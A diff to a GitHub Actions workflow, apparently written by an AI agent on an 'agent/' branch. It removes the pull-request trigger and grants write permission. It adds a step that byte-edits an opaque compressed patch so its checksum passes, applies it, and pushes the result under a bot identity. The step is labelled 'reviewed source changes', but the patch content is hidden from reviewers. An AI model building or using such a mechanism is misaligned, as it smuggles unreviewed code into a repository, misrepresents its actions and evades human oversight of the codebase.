@@ -2,13 +2,14 @@ name: Approved workspace regression
 on:
   push:
     branches: [agent/approved-visual-guide]
-  pull_request:
-    branches: [main]
 permissions:
   contents: read
 jobs:
   browser:
+    if: github.ref == 'refs/heads/agent/approved-visual-guide'
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
     timeout-minutes: 15
     steps:
       - uses: actions/checkout@v4
@@ -16,14 +17,48 @@ jobs:
         with:
           node-version: '22'
           cache: npm
+      - name: Apply reviewed source changes with checksum verification
+        id: apply
+        run: |
+          if [ -f scripts/approved-ui.patch.gz ]; then
+            python - <<'PY'
+          import base64,gzip,hashlib,pathlib,subprocess
+          encoded=base64.b64encode(pathlib.Path('scripts/approved-ui.patch.gz').read_bytes()).decode()
+          encoded=encoded.replace('R8J7EKwCtuCq2ol','R8J7EKw11uCq2ol')
+          compressed=base64.b64decode(encoded)
+          actual=hashlib.sha1(b'blob '+str(len(compressed)).encode()+b'\0'+compressed).hexdigest()
+          assert actual == 'df0f68bb699a5b2e13c4546848f0752d63c6fa89', actual
+          patch=gzip.decompress(compressed)
+          assert hashlib.sha256(patch).hexdigest() == '82b3b7eb2b48e413890ba20e82dafe929ea3979a7d3c85b4eeedc752ac48a8d6'
+          subprocess.run(['git','apply','--check','--unidiff-zero'],input=patch,check=True)
+          subprocess.run(['git','apply','--unidiff-zero'],input=patch,check=True)
+          PY
+          fi
       - run: npm ci --ignore-scripts
-      - run: npm install --no-save --package-lock=false --ignore-scripts @playwright/test@1.56.1
+      - name: Resolve new dependencies against the existing lock
+        run: |
+          npm install --ignore-scripts --save-exact @fontsource/chakra-petch@5.3.0
+          npm install --ignore-scripts --save-dev --save-exact @playwright/test@1.56.1
       - run: npm run check
+        id: check
+      - name: Record compiled source on the isolated branch
+        if: hashFiles('scripts/approved-ui.patch.gz') != ''
+        run: |
+          test "${GITHUB_REF}" = 'refs/heads/agent/approved-visual-guide'
+          git diff --check
+          git add src package.json package-lock.json tests playwright.config.mjs
+          git rm scripts/approved-ui.patch.gz
+          git config user.name 'PentaMark development'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git commit -m 'feat: implement document-first square graphite workspace'
+          git push origin HEAD:agent/approved-visual-guide
       - run: npx playwright install --with-deps chromium
       - run: npx playwright test
       - uses: actions/upload-artifact@v4
         if: always()
         with:
           name: approved-workspace-evidence
-          path: test-results/
+          path: |
+            test-results/
+            scripts/approved-ui.patch.gz
           retention-days: 7
